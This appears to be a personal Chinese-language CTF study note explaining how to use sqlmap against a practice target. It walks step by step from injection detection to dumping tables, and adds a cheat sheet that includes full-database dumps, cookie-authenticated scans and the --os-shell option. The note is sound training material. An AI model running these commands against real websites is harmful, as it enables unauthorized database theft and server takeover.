# Web 笔记13-sqlmap 简易指南（SQL注入一把梭）

> 更新：2026-08-03 ｜ 工具路径：`C:\Users\Hong\Desktop\ctf_tools\web_tools\sqlmap-master\sqlmap-master\sqlmap.py`
> 用法原则：**手动分析打底（结构/回显位）→ sqlmap 秒拖库验证**；纯盲扫遇 WAF/过滤会废，手动永远是底牌

---

## 一、sqlmap 是什么（一句话）

**sqlmap 是自动化的 SQL 注入工具**：你给它一个"可能注入了的网址"，它自己探测注入点、判断类型、然后把数据库里的数据拖出来。

```
比喻：手动注入 = 自己撬锁找宝箱；sqlmap = 叫了个开锁师傅，扫描+开锁+搬空一条龙
```

## 二、准备工作（启动）

**思路**：工具是纯 Python 写的，用命令 `python sqlmap.py` 跑。要先站到它的目录里，不然电脑找不到它。

```powershell
# ① 进工具目录（进一次，以后这个窗口都在这里敲）
cd C:\Users\Hong\Desktop\ctf_tools\web_tools\sqlmap-master\sqlmap-master

# ② 验证能跑（看到版本号 = 成功）
python sqlmap.py --version
```

**预期结果**：显示 `1.10.7.253#dev` 之类的版本号。
**如果报错"无法识别"** → 第①步没走对，重新 `cd`。

## 三、核心：梭哈五步（做题就这五条）

> 目标网址举例：`https://靶机.com/index.php?id=1`（`?id=1` 就是疑似注入点）

### 第 1 步：探测 + 列数据库
**思路**：先确认"能不能注入"+"数据库有几个"。`--dbs` 让工具列出所有数据库。
```bash
python sqlmap.py -u "https://靶机.com/index.php?id=1" --batch --dbs
```
**预期结果**：跑 1~2 分钟，看到 `available databases [4]` 列表，业务库（如 note）就在里面。

### 第 2 步：拿指定库的表
**思路**：锁定业务库，`--tables` 列出它里面的表（flag 一般藏在名字奇特的表里，如 fl4g）。
```bash
python sqlmap.py -u "https://靶机.com/index.php?id=1" --batch -D note --tables
```
**预期结果**：看到表名表格，如 `fl4g`、`notes`。

### 第 3 步：拿指定表的列
**思路**：锁定可疑表，`--columns` 看它有哪些列（flag 那列名字也常很怪，如 fllllag）。
```bash
python sqlmap.py -u "https://靶机.com/index.php?id=1" --batch -D note -T fl4g --columns
```
**预期结果**：看到列名，如 `fllllag`。

### 第 4 步：拖数据（CTF 一般到此出 flag）
**思路**：`--dump` 把整表内容倒出来。
```bash
python sqlmap.py -u "https://靶机.com/index.php?id=1" --batch -D note -T fl4g --dump
```
**预期结果**：表格里就是 flag，如 `n1book{union_select_is_so_cool}`。

### 第 5 步（可选）：终极梭哈——全库拖光
**思路**：不指定库/表，`--dump-all` 拖光所有业务库，`--exclude-sysdbs` 跳过系统库（慢，但绝不漏）。
```bash
python sqlmap.py -u "https://靶机.com/index.php?id=1" --batch --dump-all --exclude-sysdbs
```

## 四、常见命令汇总（速查表）

| 想干什么 | 命令（`...` = `-u "目标" --batch`） |
|---|---|
| 探测+列库 | `... --dbs` |
| 列表 | `... -D 库名 --tables` |
| 列列 | `... -D 库名 -T 表名 --columns` |
| 拖表 | `... -D 库名 -T 表名 --dump` |
| 全库梭哈 | `... --dump-all --exclude-sysdbs` |
| 加速 | `... --threads 10` |
| 测指定参数 | `... -p id` |
| 带登录 cookie | `... --cookie "session=xxx"` |
| 深测（更慢更全） | `... --risk 3 --level 3` |
| 弹 shell（进阶） | `... --os-shell` |

## 五、命令零件拆解（每个字母什么意思）

| 零件 | 意思 |
|---|---|
| `python sqlmap.py` | 用 Python 跑工具 |
| `-u "网址"` | 目标地址（U = URL） |
| `--batch` | **必加**！自动选默认答案，不问问题 |
| `--dbs` | 列数据库（DatabaseS） |
| `-D 库名` | 指定数据库 Database |
| `--tables` | 列 表 Tables |
| `-T 表名` | 指定 表 Table |
| `--columns` | 列 列名 Columns |
| `--dump` | 拖 数据 |
| `-p id` | 指定参数 Parameter |

## 六、三个铁律（踩坑提醒）

1. **`--batch` 永远带上**：不然它一路问"继续吗？[y/N]"，命令会卡死等你回答
2. **结果自动存档**：拖出的数据存 `C:\Users\Hong\AppData\Local\sqlmap\output\<靶机>\dump\`（CSV 文件）
3. **手动 + 工具配合**：先手动摸清列数/库名/回显位 → sqlmap 秒过验证。纯盲扫遇到 WAF/过滤会废，**手动分析永远是底牌**

## 七、常见报错

| 报错/现象 | 原因 | 解决 |
|---|---|---|
| 报"无法识别 sqlmap" | 没进对目录 | 先 `cd` 到工具目录 |
| 命令卡在提问 | 缺 `--batch` | 补上 `--batch` |
| 扫半天没结果 | 可能有 WAF/过滤 | 加 `--risk 3 --level 3` 或手动注入 |
| 下载很慢/失败 | GitHub 被墙 | 直接下载 zip 包，别用 git clone |
| 拖不出数据 | 靶机过期 | 回平台重启靶机，地址和 flag 会变 |

---

## 相关题目
- DASCTF notes（union 注入）→ `WP-[DASCTF]notes-union注入.md`（完整手动+工具实战）
